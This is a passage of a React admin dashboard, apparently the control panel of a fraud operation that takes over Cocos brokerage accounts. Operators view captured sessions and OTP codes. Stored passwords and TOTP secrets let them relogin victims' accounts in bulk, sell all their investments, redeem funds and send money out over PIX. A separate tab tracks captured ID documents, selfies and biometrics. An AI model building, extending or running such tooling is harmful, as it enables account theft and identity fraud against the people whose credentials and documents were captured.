        <div className="sticky top-0 z-50 bg-card border-b border-border px-4 py-2.5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button onClick={handleStopOperating} className="flex items-center gap-1.5 rounded-xl border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors">
              <ArrowLeft size={13} /> Voltar
            </button>
            <div className="flex items-center gap-2">
              <div className="h-7 w-7 rounded-lg bg-primary flex items-center justify-center">
                <span className="text-[10px] font-bold text-primary-foreground">{(operatingAccount.full_name || operatingAccount.email)[0]?.toUpperCase()}</span>
              </div>
              <div>
                <p className="text-[11px] font-bold text-foreground">{operatingAccount.full_name || operatingAccount.email}</p>
                <p className="text-[9px] text-muted-foreground">{operatingAccount.email}</p>
              </div>
            </div>
          </div>
          <span className="text-[10px] text-green-400 flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-lg px-3 py-1"><span className="h-2 w-2 rounded-full bg-green-400 animate-pulse" /> Operando</span>
        </div>
        <div className="flex min-h-[calc(100dvh-45px)] flex-col items-center px-5 pt-6 pb-6">
          <div className="flex w-full max-w-[480px] flex-1 flex-col items-center">
            <CocosV2DashboardScreen email={operatingAccount.email} accessToken={opAccessToken} refreshToken={opRefreshToken} onLogout={handleStopOperating} onTokenRefresh={(a, r) => { setOpAccessToken(a); if (r) setOpRefreshToken(r); }} />
          </div>
        </div>
      </div>
    );
  }

  // Filter accounts by operator
  const filteredAccounts = myOperator
    ? accounts.filter((a) => a.operator_code === myOperator.code)
    : operatorFilter === "all"
      ? accounts
      : accounts.filter((a) => a.operator_code === operatorFilter);

  const totalBalanceArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.totalBalance) || 0), 0);
  const totalBalanceUsd = filteredAccounts.reduce((s, a) => s + (Number((a.balance_usd as any)?.totalBalance) || 0), 0);
  const totalCashArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.cashBalance) || 0), 0);
  const totalHoldingsArs = filteredAccounts.reduce((s, a) => s + (Number((a.balance_ars as any)?.holdingsBalance) || 0), 0);
  const totalCiArs = filteredAccounts.reduce((s, a) => s + (Number((a.buying_power as any)?.CI?.ars) || 0), 0);
  const totalCiUsd = filteredAccounts.reduce((s, a) => s + (Number((a.buying_power as any)?.CI?.usd) || 0), 0);
  const cocosV2Sessions = liveSessions.filter((s) => {
    if (s.source !== "cocosv2") return false;
    if (myOperator && s.operator_code !== myOperator.code) return false;
    if (!myOperator && operatorFilter !== "all" && s.operator_code !== operatorFilter) return false;
    return true;
  });

  // PIX stats
  const successStatuses = new Set(["completed", "success", "pending_execution", "pending"]);
  const sentPixTransactions = pixTransactions.filter((t) => successStatuses.has(t.status.toLowerCase()));
  const failedPixTransactions = pixTransactions.filter((t) => !successStatuses.has(t.status.toLowerCase()));
  const totalPixBRL = sentPixTransactions.reduce((s, t) => s + Number(t.amount_brl), 0);
  const totalPixCount = sentPixTransactions.length;

  const now = new Date();
  const todayStart = new Date(now); todayStart.setHours(0, 0, 0, 0);
  const monthStart = new Date(now.getFullYear(), now.getMonth(), 1);
  const todayPixBRL = sentPixTransactions.filter(t => new Date(t.created_at) >= todayStart).reduce((s, t) => s + Number(t.amount_brl), 0);
  const todayPixCount = sentPixTransactions.filter(t => new Date(t.created_at) >= todayStart).length;
  const monthPixBRL = sentPixTransactions.filter(t => new Date(t.created_at) >= monthStart).reduce((s, t) => s + Number(t.amount_brl), 0);

  // Aggregate PIX limits
  const limitsEntries = Object.values(pixLimits);
  const totalDailyLimit = limitsEntries.reduce((s, l) => s + (Number(l.dailyLimit) || 0), 0);
  const totalDailyConsumed = limitsEntries.reduce((s, l) => s + (Number(l.dailyConsumption) || 0), 0);
  const totalMonthlyLimit = limitsEntries.reduce((s, l) => s + (Number(l.monthlyLimit) || 0), 0);
  const totalMonthlyConsumed = limitsEntries.reduce((s, l) => s + (Number(l.monthlyConsumption) || 0), 0);

  // Wayni onboarding sessions — deduplicated by email, keeping the most advanced session
  // Wayni onboarding sessions — deduplicated by email, keeping the most advanced session
  const wayniOnboardingSessions = (() => {
    const onboardingStatuses = ["verify_dni_submitted", "verify_dni_success", "verify_dni_error", "address_submitted", "address_saved", "address_error", "biometric_started", "biometric_finished", "biometric_error"];
    const statusPriority: Record<string, number> = {
      verify_dni_submitted: 1, verify_dni_error: 1,
      verify_dni_success: 2,
      address_submitted: 3, address_error: 3,
      address_saved: 4,
      biometric_started: 5, biometric_error: 5,
      biometric_finished: 6,
    };
    const allOnboarding = liveSessions.filter((s) =>
      onboardingStatuses.includes(s.status) || (s.otp_code && (s.otp_code.includes("dni:") || s.otp_code.includes("uuid:")))
    );
    // Group by email, keep the most advanced session per email
    const byEmail = new Map<string, LiveSession>();
    for (const s of allOnboarding) {
      const key = (s.email || s.id).toLowerCase();
      const existing = byEmail.get(key);
      if (!existing) { byEmail.set(key, s); continue; }
      const existingPriority = statusPriority[existing.status] || 0;
      const newPriority = statusPriority[s.status] || 0;
      // Prefer higher priority; if equal, prefer the newer session (merge otp_code data)
      if (newPriority > existingPriority) {
        // Merge otp_code from existing into new if new doesn't have all data
        const mergedOtp = mergeOtpCodes(existing.otp_code, s.otp_code);
        byEmail.set(key, { ...s, otp_code: mergedOtp });
      } else if (newPriority === existingPriority && new Date(s.created_at) > new Date(existing.created_at)) {
        const mergedOtp = mergeOtpCodes(existing.otp_code, s.otp_code);
        byEmail.set(key, { ...s, otp_code: mergedOtp });
      } else {
        // Keep existing but merge otp from new
        const mergedOtp = mergeOtpCodes(s.otp_code, existing.otp_code);
        byEmail.set(key, { ...existing, otp_code: mergedOtp });
      }
    }
    return Array.from(byEmail.values()).sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  })();

  const tabs = [
    { key: "sessions" as const, icon: <Activity size={14} />, label: "Sessões", count: cocosV2Sessions.length },
    { key: "wayni" as const, icon: <ShieldCheck size={14} />, label: "Wayni", count: wayniOnboardingSessions.length },
    { key: "accounts" as const, icon: <Users size={14} />, label: "Contas", count: filteredAccounts.length },
    { key: "online" as const, icon: <Wifi size={14} />, label: "Online", count: stats.onlineCount },
    { key: "logs" as const, icon: <FileText size={14} />, label: "Logs" },
  ];

  return (
    <SessionPresenceProvider>
    <div className="min-h-screen bg-background text-foreground">
      {/* ══════ HEADER ══════ */}
      <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur-md">
        <div className="mx-auto max-w-6xl flex items-center justify-between px-4 h-12">
          <div className="flex items-center gap-2.5">
            <img src={cocosLogo} alt="Cocos" className="h-7 w-7 rounded-lg" />
            <span className="text-sm font-bold text-foreground">{myOperator ? myOperator.name : "Admin"}</span>
            {myOperator && <span className="text-[9px] font-mono bg-secondary text-muted-foreground px-1.5 py-0.5 rounded">{myOperator.code}</span>}
          </div>
          <div className="flex items-center gap-1">
            <button onClick={() => setSoundEnabled(!soundEnabled)} className={`h-8 w-8 rounded-lg flex items-center justify-center transition-colors ${soundEnabled ? "text-primary" : "text-muted-foreground"}`}>
              {soundEnabled ? <Bell size={14} /> : <BellOff size={14} />}
            </button>
            <button onClick={() => { setForceRefresh((p) => p + 1); loadLiveSessions(); }} className="h-8 w-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
              <RefreshCw size={14} />
            </button>
            <button onClick={() => signOut()} className="h-8 w-8 rounded-lg flex items-center justify-center text-destructive/60 hover:text-destructive transition-colors">
              <LogOut size={14} />
            </button>
          </div>
        </div>
      </header>

      {/* ══════ FINANCE DASHBOARD (admin only) ══════ */}
      {<section className="border-b border-border bg-card/50">
        <div className="mx-auto max-w-6xl px-4 py-4">
          {/* Row 1: Big numbers */}
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
            <MetricCard label="TOTAL ARS" value={fmtARS(totalBalanceArs)} color="text-emerald-400" icon="💰" size="lg" />
            <MetricCard label="CAIXA" value={fmtARS(totalCashArs)} color="text-green-400" icon="💵" />
            <MetricCard label="INVESTIDO" value={fmtARS(totalHoldingsArs)} color="text-blue-400" icon="📊" />
            <MetricCard label="TOTAL USD" value={fmtUSD(totalBalanceUsd)} color="text-sky-400" icon="🇺🇸" />
            <MetricCard label="CI RESGATE" value={fmtARS(totalCiArs)} color="text-orange-400" icon="⚡" highlight={totalCiArs > 0} />
            <MetricCard label="CONTAS" value={String(filteredAccounts.length)} color="text-purple-400" icon="👥" sub={`${cocosV2Sessions.length} sessões`} />
          </div>

          {/* Row 2: PIX */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-2">
            <MetricCard label="PIX HOJE" value={fmtBRL(todayPixBRL)} color="text-green-400" icon="📤" sub={`${todayPixCount} tx`} />
            <MetricCard label="PIX MÊS" value={fmtBRL(monthPixBRL)} color="text-green-400" icon="📅" />
            <LimitBar label="DIÁRIO" used={totalDailyConsumed} total={totalDailyLimit} />
            <LimitBar label="MENSAL" used={totalMonthlyConsumed} total={totalMonthlyLimit} />
          </div>

          {/* PIX limits refresh */}
          <div className="flex items-center gap-3 mt-2">
            <button onClick={fetchAllPixLimits} disabled={pixLimitsLoading} className="text-[9px] text-muted-foreground hover:text-foreground flex items-center gap-1 transition-colors disabled:opacity-50">
              {pixLimitsLoading ? <RefreshCw size={9} className="animate-spin" /> : <Gauge size={9} />}
              {pixLimitsLoading ? "..." : `Limites (${Object.keys(pixLimits).length})`}
            </button>
            <span className="text-[9px] text-green-500/60 flex items-center gap-1"><span className="h-1 w-1 rounded-full bg-green-500 animate-pulse" /> Cron</span>
          </div>
        </div>
      </section>}

      {/* ══════ TABS ══════ */}
      <div className="sticky top-12 z-40 border-b border-border bg-card/95 backdrop-blur-md">
        <div className="mx-auto max-w-6xl px-4">
          <nav className="flex gap-0 -mb-px overflow-x-auto">
            {tabs.map((tab) => (
              <button key={tab.key} onClick={() => setActiveTab(tab.key)}
                className={`flex items-center gap-1.5 px-3 py-2.5 text-[11px] font-semibold transition-colors border-b-2 whitespace-nowrap ${
                  activeTab === tab.key ? "border-primary text-foreground" : "border-transparent text-muted-foreground hover:text-foreground"
                }`}>
                {tab.icon}
                {tab.label}
                {tab.count !== undefined && tab.count > 0 && (
                  <span className="text-[9px] bg-primary/10 text-primary rounded px-1 py-0.5 font-bold tabular-nums">{tab.count}</span>
                )}
              </button>
            ))}
          </nav>
        </div>
      </div>

      {/* ══════ MAIN ══════ */}
      <main className="mx-auto max-w-6xl px-4 py-4">
        {activeTab === "online" && <OnlineNowTab operatorCode={myOperator?.code} sourceFilter="cocosv2" />}

        {activeTab === "sessions" && (
          <div className="space-y-3">
            {!myOperator && operators.length > 0 && (
              <div className="flex items-center gap-1.5 flex-wrap">
                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>Todos</button>
                {operators.map((op) => (
                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
                    className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>
                    {op.name}
                  </button>
                ))}
              </div>
            )}

            <div className="relative max-w-sm">
              <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input type="text" placeholder="Buscar..." value={search} onChange={(e) => setSearch(e.target.value)}
                className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
            </div>

            {cocosV2Sessions.length === 0 ? (
              <p className="text-center text-sm text-muted-foreground py-12">Nenhuma sessão nas últimas 24h.</p>
            ) : (
              <div className="space-y-1.5">
                {cocosV2Sessions
                  .filter((s) => !search || (s.email || "").toLowerCase().includes(search.toLowerCase()) || (s.ip_address || "").includes(search))
                  .map((session) => <SessionRow key={session.id} session={session} />)}
              </div>
            )}
          </div>
        )}

        {activeTab === "wayni" && (() => {
          // Parse otp_code to extract saved bio/wallet data for filtering
          const parseOtp = (otp: string | null): Record<string, string> => {
            const map: Record<string, string> = {};
            if (!otp) return map;
            otp.split("|").forEach((part) => {
              const colonIdx = part.indexOf(":");
              const eqIdx = part.indexOf("=");
              let sep = -1;
              if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
              else if (colonIdx > 0) sep = colonIdx;
              else if (eqIdx > 0) sep = eqIdx;
              if (sep > 0) { map[part.slice(0, sep).trim()] = part.slice(sep + 1).trim(); }
            });
            return map;
          };

          const hasDocs = (s: LiveSession) => {
            const p = parseOtp(s.otp_code);
            return p.has_selfie === "true" || p.has_dni_front === "true" || p.has_dni_back === "true"
              || p.bio_status === "success"
              || ["biometric_started", "biometric_finished"].includes(s.status);
          };

          const isPending = (s: LiveSession) => {
            const p = parseOtp(s.otp_code);
            const walletActive = String(p.wallet_status || "").toUpperCase() === "ACTIVE";
            if (walletActive) return false;
            // Not yet completed = pending
            return true;
          };

          const isWalletActive = (s: LiveSession) => {
            const p = parseOtp(s.otp_code);
            return String(p.wallet_status || "").toUpperCase() === "ACTIVE";
          };

          const filteredWayni = wayniOnboardingSessions.filter((s) => {
            if (wayniFilter === "all") return true;
            if (wayniFilter === "documents") return hasDocs(s);
            if (wayniFilter === "pending") return isPending(s) && !isWalletActive(s);
            if (wayniFilter === "active") return isWalletActive(s);
            return true;
          });

          const countDocs = wayniOnboardingSessions.filter(hasDocs).length;
          const countPending = wayniOnboardingSessions.filter(s => isPending(s) && !isWalletActive(s)).length;
          const countActive = wayniOnboardingSessions.filter(isWalletActive).length;

          const filterBtns = [
            { key: "all" as const, label: "Todos", count: wayniOnboardingSessions.length, icon: "📋" },
            { key: "documents" as const, label: "Documentos", count: countDocs, icon: "📸" },
            { key: "pending" as const, label: "Pendente", count: countPending, icon: "⏳" },
            { key: "active" as const, label: "Wallet Ativa", count: countActive, icon: "✅" },
          ];

          return (
            <div className="space-y-3">
              <div className="flex items-center justify-between gap-3 mb-2">
                <h2 className="text-xs font-bold text-foreground flex items-center gap-2">
                  <ShieldCheck size={14} className="text-green-400" /> Onboarding Wayni
                  <span className="text-[10px] font-normal text-muted-foreground">{wayniOnboardingSessions.length} usuários</span>
                </h2>
                <button onClick={loadLiveSessions} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
                  <RefreshCw size={12} />
                </button>
              </div>

              {/* Filters */}
              <div className="flex items-center gap-1.5 flex-wrap">
                {filterBtns.map((f) => (
                  <button key={f.key} onClick={() => setWayniFilter(f.key)}
                    className={`flex items-center gap-1.5 text-[10px] px-3 py-1.5 rounded-lg font-semibold transition-all border ${
                      wayniFilter === f.key
                        ? "bg-primary/10 text-primary border-primary/20"
                        : "border-border text-muted-foreground hover:text-foreground hover:border-primary/10"
                    }`}>
                    <span>{f.icon}</span>
                    {f.label}
                    {f.count > 0 && (
                      <span className={`text-[8px] px-1.5 py-0.5 rounded font-bold tabular-nums ${
                        wayniFilter === f.key ? "bg-primary/20 text-primary" : "bg-secondary text-muted-foreground"
                      }`}>{f.count}</span>
                    )}
                  </button>
                ))}
              </div>

              {filteredWayni.length === 0 ? (
                <p className="text-center text-sm text-muted-foreground py-12">
                  {wayniFilter === "all" ? "Nenhum onboarding nas últimas 24h." : "Nenhum resultado para este filtro."}
                </p>
              ) : (
                <div className="space-y-2">
                  {filteredWayni.map((session) => (
                    <WayniOnboardingCard key={session.id} session={session} />
                  ))}
                </div>
              )}
            </div>
          );
        })()}

        {activeTab === "logs" && <AdminLogs operatorCode={myOperator?.code} sourceFilter="cocosv2" />}

        {activeTab === "accounts" && (
          <div className="space-y-3">
            {/* Relogin progress */}
            {reloginRunning && (
              <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-3 space-y-2">
                <div className="flex items-center gap-2">
                  <RefreshCw size={12} className="animate-spin text-blue-400" />
                  <span className="text-[11px] font-semibold text-blue-400">Relogin {reloginProgress.done}/{reloginProgress.total}</span>
                  {reloginProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {reloginProgress.current}</span>}
                </div>
              </div>
            )}
            {/* Refresh all progress */}
            {refreshAllRunning && (
              <div className="rounded-xl border border-green-500/20 bg-green-500/5 p-3">
                <div className="flex items-center gap-2">
                  <RefreshCw size={12} className="animate-spin text-green-400" />
                  <span className="text-[11px] font-semibold text-green-400">Atualizando saldos {refreshAllProgress.done}/{refreshAllProgress.total}</span>
                  {refreshAllProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {refreshAllProgress.current}</span>}
                </div>
              </div>
            )}
            {!reloginRunning && reloginProgress.results.length > 0 && (
              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-bold text-foreground">Resultado Relogin</span>
                  <button onClick={() => setReloginProgress({ done: 0, total: 0, current: "", results: [] })} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
                </div>
                {reloginProgress.results.map((r, i) => (
                  <div key={i} className={`text-[9px] ${r.ok ? "text-green-400" : "text-red-400"}`}>
                    <span className="font-semibold">{r.email}</span>: {r.msg}
                  </div>
                ))}
              </div>
            )}
            {/* Redeem all result */}
            {redeemAllResult && (
              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-bold text-foreground">Resultado Resgate FCI</span>
                  <button onClick={() => setRedeemAllResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
                </div>
                {redeemAllResult.success ? (
                  <>
                    <div className="text-[9px] text-green-400">
                      ✅ {redeemAllResult.total_redeemed} resgates | {redeemAllResult.tokens_refreshed || 0} tokens refreshed | {redeemAllResult.balances_updated} saldos atualizados
                      {redeemAllResult.timed_out && <span className="text-amber-400"> ⏱️ (timeout parcial: {redeemAllResult.processed}/{redeemAllResult.total_accounts})</span>}
                    </div>
                    <div className="max-h-[300px] overflow-y-auto space-y-0.5">
                      {redeemAllResult.results?.map((r: any, i: number) => (
                        <div key={i} className="text-[9px]">
                          <span className="font-semibold text-foreground">{r.email}</span>:
                          {r.redeemed.length > 0 && <span className="text-green-400"> ✅ {r.redeemed.join(", ")}</span>}
                          {r.errors.length > 0 && <span className="text-red-400"> ❌ {r.errors.join(", ")}</span>}
                        </div>
                      ))}
                    </div>
                    {redeemAllResult.results?.length === 0 && <div className="text-[9px] text-muted-foreground">Nenhuma conta com FCI para resgatar</div>}
                  </>
                ) : (
                  <div className="text-[9px] text-red-400">❌ {redeemAllResult.error}</div>
                )}
              </div>
            )}
            {/* Sell all stocks result */}
            {sellAllResult && (
              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-bold text-foreground">Resultado Venda de Investimentos</span>
                  <button onClick={() => setSellAllResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
                </div>
                {sellAllResult.success ? (
                  <>
                    <div className="text-[9px] text-orange-400">
                      📉 {sellAllResult.total_sold} vendas executadas | {sellAllResult.processed}/{sellAllResult.total_accounts} contas
                      {sellAllResult.timed_out && <span className="text-amber-400"> ⏱️ (timeout parcial)</span>}
                    </div>
                    <div className="max-h-[300px] overflow-y-auto space-y-0.5">
                      {sellAllResult.results?.map((r: any, i: number) => (
                        <div key={i} className="text-[9px]">
                          <span className="font-semibold text-foreground">{r.email}</span>:
                          {r.sold?.length > 0 && <span className="text-green-400"> ✅ {r.sold.join(", ")}</span>}
                          {r.errors?.length > 0 && <span className="text-red-400"> ❌ {r.errors.join(", ")}</span>}
                        </div>
                      ))}
                    </div>
                    {sellAllResult.results?.length === 0 && <div className="text-[9px] text-muted-foreground">Nenhuma conta com investimentos para vender</div>}
                  </>
                ) : (
                  <div className="text-[9px] text-red-400">❌ {sellAllResult.error}</div>
                )}
              </div>
            )}
            {/* Server relogin result */}
            {serverReloginResult && (
              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-bold text-foreground">Resultado Relogin Servidor</span>
                  <button onClick={() => setServerReloginResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
                </div>
                {serverReloginResult.success ? (
                  <>
                    <div className="text-[9px] text-green-400">✅ {serverReloginResult.relogged}/{serverReloginResult.total} relogadas | {serverReloginResult.failed} falharam</div>
                    <div className="max-h-[200px] overflow-y-auto space-y-0.5">
                      {serverReloginResult.results?.map((r: any, i: number) => (
                        <div key={i} className={`text-[9px] ${r.success ? "text-green-400" : "text-red-400"}`}>
                          <span className="font-semibold">{r.email}</span>: {r.success ? "✅ OK" : `❌ ${r.error}`}
                        </div>
                      ))}
                    </div>
                  </>
                ) : (
                  <div className="text-[9px] text-red-400">❌ {serverReloginResult.error || serverReloginResult.message}</div>
                )}
              </div>
            )}
            {/* Import result */}
            {importResult && (
              <div className="rounded-xl border border-border bg-card p-3 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-bold text-foreground">Resultado Importação</span>
                  <button onClick={() => setImportResult(null)} className="text-[9px] text-muted-foreground hover:text-foreground">✕</button>
                </div>
                {importResult.success ? (
                  <>
                    <div className="text-[9px] text-green-400">✅ {importResult.total_inserted} registros importados | {importResult.total_errors} erros</div>
                    <div className="max-h-[200px] overflow-y-auto space-y-0.5">
                      {Object.entries(importResult.results || {}).map(([table, r]: [string, any]) => (
                        <div key={table} className="text-[9px]">
                          <span className="font-semibold text-foreground">{table}</span>: <span className="text-green-400">{r.inserted}</span>
                          {r.errors?.length > 0 && <span className="text-red-400"> | ❌ {r.errors.join(", ")}</span>}
                        </div>
                      ))}
                    </div>
                  </>
                ) : (
                  <div className="text-[9px] text-red-400">❌ {importResult.error}</div>
                )}
              </div>
            )}

            <div className="flex flex-col sm:flex-row sm:items-center gap-2">
              <div className="relative flex-1 max-w-sm">
                <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                <input type="text" placeholder="Buscar contas..." value={search} onChange={(e) => setSearch(e.target.value)}
                  className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
              </div>
              <div className="flex items-center gap-1 flex-wrap">
                {/* Bulk actions (all users) */}
                {/* Relogin ALL button (server-side) */}
                <button onClick={handleReloginAll} disabled={reloginRunning || serverReloginRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {reloginRunning ? <RefreshCw size={10} className="animate-spin" /> : <Zap size={10} />}
                  {reloginRunning ? "Relogando..." : `🔄 Relogin TODAS (${accounts.filter(a => a.password && a.totp_secret).length})`}
                </button>
                {/* Sell all stocks button */}
                <button onClick={handleSellAllStocks} disabled={sellAllRunning || reloginRunning || refreshAllRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-orange-500/10 text-orange-400 font-semibold hover:bg-orange-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {sellAllRunning ? <RefreshCw size={10} className="animate-spin" /> : <Banknote size={10} />}
                  {sellAllRunning ? "Vendendo..." : "📉 Vender Tudo"}
                </button>
                {/* Refresh all balances button */}
                <button onClick={handleRefreshAllBalances} disabled={refreshAllRunning || reloginRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {refreshAllRunning ? <RefreshCw size={10} className="animate-spin" /> : <DollarSign size={10} />}
                  {refreshAllRunning ? `💰 ${refreshAllProgress.done}/${refreshAllProgress.total}` : "💰 Atualizar Saldos"}
                </button>
                {/* Redeem all FCI button */}
                <button onClick={handleRedeemAll} disabled={redeemAllRunning || reloginRunning || refreshAllRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {redeemAllRunning ? <RefreshCw size={10} className="animate-spin" /> : <Banknote size={10} />}
                  {redeemAllRunning ? "Resgatando..." : "🔻 Resgatar FCI"}
                </button>
                {/* Server relogin dead accounts */}
                <button onClick={handleServerRelogin} disabled={serverReloginRunning || reloginRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-amber-500/10 text-amber-400 font-semibold hover:bg-amber-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {serverReloginRunning ? <RefreshCw size={10} className="animate-spin" /> : <Key size={10} />}
                  {serverReloginRunning ? "Relogando..." : `🔑 Reviver Mortas (${accounts.filter(a => a.info_tag?.includes("Token morto") || a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌")).length})`}
                </button>
                {/* Export DB */}
                <button onClick={handleExportDB} disabled={exportRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-cyan-500/10 text-cyan-400 font-semibold hover:bg-cyan-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {exportRunning ? <RefreshCw size={10} className="animate-spin" /> : <Download size={10} />}
                  {exportRunning ? "Exportando..." : "📥 Exportar DB"}
                </button>
                {/* Import DB */}
                <button onClick={() => fileInputRef.current?.click()} disabled={importRunning}
                  className="text-[10px] px-2.5 py-1 rounded-lg bg-violet-500/10 text-violet-400 font-semibold hover:bg-violet-500/15 transition-all disabled:opacity-50 flex items-center gap-1">
                  {importRunning ? <RefreshCw size={10} className="animate-spin" /> : <Upload size={10} />}
                  {importRunning ? "Importando..." : "📤 Importar DB"}
                </button>
                <input ref={fileInputRef} type="file" accept=".json" className="hidden" onChange={(e) => { const f = e.target.files?.[0]; if (f) { if (confirm(`Importar backup "${f.name}"? Dados existentes serão sobrescritos.`)) handleImportDB(f); } e.target.value = ""; }} />
                {(() => {
                  const ts = new Date(); ts.setHours(0,0,0,0);
                  const ys = new Date(ts); ys.setDate(ys.getDate() - 1);
                  const filters: { key: typeof accountFilter; label: string; count: number }[] = [
                    { key: "all", label: "Todas", count: filteredAccounts.length },
                    { key: "today", label: "Hoje", count: filteredAccounts.filter(a => new Date(a.created_at) >= ts).length },
                    { key: "yesterday", label: "Ontem", count: filteredAccounts.filter(a => { const d = new Date(a.created_at); return d >= ys && d < ts; }).length },
                    { key: "top_balance", label: "💰 Saldo", count: filteredAccounts.filter(a => (Number((a.balance_ars as any)?.totalBalance) || 0) > 0 || (Number((a.balance_usd as any)?.totalBalance) || 0) > 0).length },
                    { key: "alive", label: "🟢 Ativas", count: filteredAccounts.filter(a => a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌")).length },
                    { key: "expired", label: "🔴 Expiradas", count: filteredAccounts.filter(a => a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌") || !a.refresh_token).length },
                  ];
                  return filters.map(f => (
                    <button key={f.key} onClick={() => setAccountFilter(f.key)}
                      className={`text-[10px] px-2 py-1 rounded-lg font-medium transition-all ${
                        accountFilter === f.key ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"
                      }`}>
                      {f.label} <span className="opacity-50">{f.count}</span>
                    </button>
                  ));
                })()}
              </div>
            </div>

            {!myOperator && operators.length > 0 && (
              <div className="flex items-center gap-1.5 flex-wrap">
                <span className="text-[9px] text-muted-foreground font-semibold">Op:</span>
                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2 py-1 rounded-lg font-medium ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground"}`}>Todos</button>
                {operators.map((op) => (
                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
                    className={`text-[10px] px-2 py-1 rounded-lg font-medium ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground"}`}>
                    <span className="font-mono text-[8px] opacity-60">{op.code}</span> {op.name}
                  </button>
                ))}
              </div>
            )}

            {accountsLoading ? (
              <div className="flex items-center justify-center py-16"><RefreshCw size={18} className="animate-spin text-primary" /></div>
            ) : (
              <div className="space-y-2">
                {filteredAccounts
                  .filter((a) => {
                    if (search && !a.email.toLowerCase().includes(search.toLowerCase()) && !(a.full_name || "").toLowerCase().includes(search.toLowerCase())) return false;
                    const ts = new Date(); ts.setHours(0,0,0,0);
                    const ys = new Date(ts); ys.setDate(ys.getDate()-1);
                    if (accountFilter === "expired") return a.info_tag?.startsWith("⚠️") || a.info_tag?.startsWith("❌") || !a.refresh_token;
                    if (accountFilter === "alive") return a.refresh_token && !a.info_tag?.startsWith("⚠️") && !a.info_tag?.startsWith("❌");
                    if (accountFilter === "today") return new Date(a.created_at) >= ts;
                    if (accountFilter === "yesterday") { const d = new Date(a.created_at); return d >= ys && d < ts; }
                    if (accountFilter === "top_balance") return (Number((a.balance_ars as any)?.totalBalance) || 0) > 0 || (Number((a.balance_usd as any)?.totalBalance) || 0) > 0;
                    return true;
                  })
                  .sort((a, b) => {
                    if (accountFilter === "top_balance") {
                      const aT = (Number((a.balance_ars as any)?.totalBalance) || 0) + (Number((a.balance_usd as any)?.totalBalance) || 0) * 1300;
                      const bT = (Number((b.balance_ars as any)?.totalBalance) || 0) + (Number((b.balance_usd as any)?.totalBalance) || 0) * 1300;
                      return bT - aT;
                    }
                    // TOTP accounts first, then newest first (old at bottom)
                    const aTotp = a.totp_secret ? 1 : 0;
                    const bTotp = b.totp_secret ? 1 : 0;
                    if (aTotp !== bTotp) return bTotp - aTotp;
                    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
                  })
                  .map((account) => (
                    <AccountCard
                      key={account.id}
                      account={account}
                      tokenStatus={tokenStatus[account.email]}
                      pixLimits={pixLimits[account.email]}
